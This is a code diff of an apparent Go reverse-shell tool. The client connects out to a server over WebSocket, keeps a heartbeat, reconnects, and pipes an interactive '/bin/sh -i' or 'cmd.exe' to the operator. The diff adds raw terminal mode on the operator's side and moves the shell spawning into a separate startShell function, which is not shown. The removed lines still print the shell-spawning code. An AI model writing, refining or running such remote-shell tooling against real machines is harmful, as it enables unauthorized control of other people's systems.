@@ -8,14 +8,13 @@ import (
 	"log"
 	"net/http"
 	"os"
-	"os/exec"
-	"runtime"
 	"strings"
 	"sync"
 	"time"
 
 	"github.com/gin-gonic/gin"
 	"github.com/gorilla/websocket"
+	"golang.org/x/term"
 )
 
 const (
@@ -270,15 +269,25 @@ func enterSession(id string, client *Client) {
 	manager.Active = id
 	defer func() { manager.Active = "" }()
 
+	// 开启 Raw 模式
+	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
+	if err != nil {
+		log.Printf("Failed to set raw mode: %v", err)
+		return
+	}
+	defer term.Restore(int(os.Stdin.Fd()), oldState)
+
 	stream := &WSStream{Conn: client.Conn, ReadChan: client.ReadChan}
 
 	// 管道对接：本地 Stdin -> 远程
 	go io.Copy(stream, os.Stdin)
-	
+
 	// 管道对接：远程 -> 本地 Stdout
 	// 这行代码会阻塞，直到连接断开
 	io.Copy(os.Stdout, stream)
-	
+
+	// 恢复终端模式后再打印退出信息，避免格式混乱
+	term.Restore(int(os.Stdin.Fd()), oldState)
 	fmt.Println("\n[*] Session closed.")
 }
 
@@ -298,17 +307,7 @@ func startClient(addr string) {
 		}
 
 		// 2. 准备 Shell
-		var cmd *exec.Cmd
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("cmd.exe")
-		} else {
-			cmd = exec.Command("/bin/sh", "-i")
-		}
-
 		stream := &WSStream{Conn: conn}
-		cmd.Stdin = stream
-		cmd.Stdout = stream
-		cmd.Stderr = stream
 
 		// 启动心跳包发送
 		done := make(chan struct{})
@@ -328,8 +327,8 @@ func startClient(addr string) {
 		}()
 
 		// 3. 执行 Shell (阻塞直到退出)
-		cmd.Run()
-		
+		startShell(stream)
+
 		// 4. Shell 退出或断开后，关闭连接并准备重连
 		close(done)
 		conn.Close()
